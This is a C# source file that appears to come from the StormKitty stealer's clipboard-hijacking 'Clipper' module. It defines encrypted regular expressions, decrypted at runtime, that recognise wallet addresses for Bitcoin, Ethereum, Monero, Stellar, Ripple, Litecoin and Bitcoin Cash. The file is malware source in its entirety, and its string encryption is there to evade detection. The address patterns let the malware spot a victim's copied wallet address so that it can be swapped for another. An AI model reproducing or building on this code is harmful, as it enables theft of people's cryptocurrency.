using StormKitty.Implant;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper
{
    internal sealed class RegexPatterns
    {
        // Encrypted regex
        public static Dictionary<string, Regex> PatternsList = new Dictionary<string, Regex>()
        {
            {"btc", new Regex(StringsCrypt.Decrypt(new byte[] { 101, 104, 232, 70, 131, 2, 105, 11, 2, 134, 44, 169, 122, 56, 46, 129, 23, 27, 97, 212, 199, 158, 175, 16, 165, 241, 141, 164, 102, 3, 5, 145, 147, 77, 3, 92, 37, 233, 1, 191, 166, 188, 170, 84, 34, 205, 172, 252, })) }, // Bitcoin
            {"eth", new Regex(StringsCrypt.Decrypt(new byte[] { 178, 131, 17, 73, 228, 215, 208, 239, 165, 193, 44, 48, 244, 234, 63, 230, 249, 53, 85, 154, 69, 110, 174, 226, 78, 114, 252, 113, 216, 176, 84, 187, })) }, // Ethereum
            {"xmr", new Regex(StringsCrypt.Decrypt(new byte[] { 135, 229, 55, 150, 69, 209, 91, 93, 46, 90, 196, 231, 29, 190, 16, 186, 42, 117, 213, 27, 254, 72, 32, 245, 73, 139, 159, 131, 178, 77, 74, 190, 103, 137, 128, 84, 9, 254, 20, 155, 102, 86, 11, 208, 26, 72, 38, 254, })) }, // Monero
            {"xlm", new Regex(StringsCrypt.Decrypt(new byte[] { 21, 45, 209, 236, 195, 53, 75, 126, 153, 32, 111, 94, 236, 195, 252, 51, 71, 3, 210, 165, 156, 130, 132, 67, 157, 162, 72, 182, 173, 220, 189, 190, })) }, // Stellar
            {"xrp", new Regex(StringsCrypt.Decrypt(new byte[] { 71, 128, 116, 254, 1, 99, 166, 213, 120, 158, 166, 85, 160, 13, 83, 52, 240, 208, 54, 57, 216, 28, 129, 7, 129, 119, 188, 131, 10, 75, 64, 17, })) }, // Ripple
            {"ltc", new Regex(StringsCrypt.Decrypt(new byte[] { 141, 183, 173, 79, 205, 14, 126, 4, 121, 145, 136, 39, 118, 18, 56, 83, 255, 155, 36, 223, 39, 49, 9, 181, 106, 92, 86, 146, 171, 93, 231, 105, 182, 141, 147, 125, 129, 163, 116, 246, 174, 123, 57, 201, 139, 61, 181, 136, })) }, // Litecoin
            {"bch", new Regex(StringsCrypt.Decrypt(new byte[] { 148, 241, 126, 127, 231, 116, 221, 234, 149, 81, 43, 23, 206, 211, 66, 31, 7, 1, 108, 100, 234, 171, 246, 190, 244, 243, 106, 45, 193, 68, 178, 177, 176, 125, 164, 74, 37, 31, 143, 12, 17, 121, 242, 77, 100, 77, 135, 156, })) }, // Bitcoin Cash
        };
    }
}
